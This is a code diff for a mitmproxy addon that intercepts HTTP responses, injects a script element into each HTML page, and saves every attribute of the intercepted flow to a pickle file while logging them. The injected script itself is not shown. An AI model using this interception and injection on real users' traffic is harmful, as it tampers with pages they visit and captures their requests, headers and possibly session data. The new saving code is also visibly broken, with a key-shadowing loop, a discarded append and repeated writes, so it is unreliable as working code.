@@ -2,18 +2,44 @@ from mitmproxy import ctx
 import dataframing
 from bs4 import BeautifulSoup   # nice representation of the DOM
 import pandas as pd
-data = {'bodys':'','urls':''}
-hlist = []
-urls = []
-bodys = []
+import pickle
+import time
 
 
-def saveData(data):
-	#data['html'] = hlist
-	df = pd.DataFrame()
-	df = df.from_dict(data)
-	df.to_pickle('./html')#,index=False)
+def appendPickle(data):
+	df1 = pd.read_pickle("./pickles/data.pickle")
+	df = pd.DataFrame().from_dict(data)
+	df.columns = df1.columns
+	l = len(df) + len(df1)
+	df.append(df1, index=[0])
+	df.to_pickle("./pickles/data.pickle")
 	ctx.log.info("saved")
+
+
+def saveData(flow):
+	flow_dict = vars(flow)
+	data = {}
+
+	# try:
+	# 	df = pd.read_pickle('./pickles/data.pickle')
+	# except:
+	# 	df = pd.DataFrame()
+	# data = {}
+	for item in flow_dict:
+		key = str(item)
+		value = str(flow_dict[key])
+		ctx.log.info(f"key: {key}")
+		ctx.log.info(f"value: {value}")
+		while len(value) > 500:
+			value = BeautifulSoup(value, features = "html.parser")
+			for key in value:
+				value = str(value[key])
+		else:
+			data[key] = value
+
+		appendPickle(data)
+
+		
 
 	
 def response(flow):
@@ -33,21 +59,8 @@ def response(flow):
 		html.body.insert(1, script)
 		flow.response.text = str(html)
 		ctx.log.info("script injected")
-
-		for item in flow.response.headers:
-			ctx.log.info(f'Header: {str(item)}')
-			
-		###
-		bodys.append(str(html.body))
-		urls.append(str(flow.request.url))
-		#data['urls'] = urls
-		#data['bodys']=bodys
-
-		ctx.log.info(str(data.urls))
-
-		saveData(vars(flow.request))
+		saveData(flow)
 		
-
 
 
 
